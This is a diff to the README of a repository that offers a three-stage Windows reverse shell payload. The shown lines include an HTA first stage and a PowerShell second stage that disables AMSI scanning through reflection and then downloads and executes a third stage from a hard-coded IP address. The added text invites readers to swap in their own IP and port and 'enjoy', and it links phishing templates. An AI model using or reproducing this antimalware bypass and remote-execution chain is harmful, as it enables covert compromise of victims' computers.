@@ -1,9 +1,9 @@
 # reverseshell
-A small 3 stage reverse shell payload for windows
+A small 3-stage reverse shell payload for windows
 
-````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````
+Change the IP and PORT on all payloads and enjoy!😉
 
-STAGE1.hta
+STAGE1.hta 
 
 ````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````
 <!DOCTYPE html>
@@ -23,7 +23,6 @@ STAGE1.hta
 <body>
 </body>
 </html>
-
 ````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````
 
 STAGE2.ps1
@@ -32,7 +31,6 @@ STAGE2.ps1
 
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
 iex (iwr http://172.20.10.6/stage3.ps1 -UseBasicParsing)
-
 ````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````
 
 STAGE3.ps1
@@ -56,5 +54,5 @@ https://cyberchef.io/
 https://github.com/ZeroPointSecurity/PhishingTemplates/tree/master
 
 
-
+HAPPY HACKING!
 
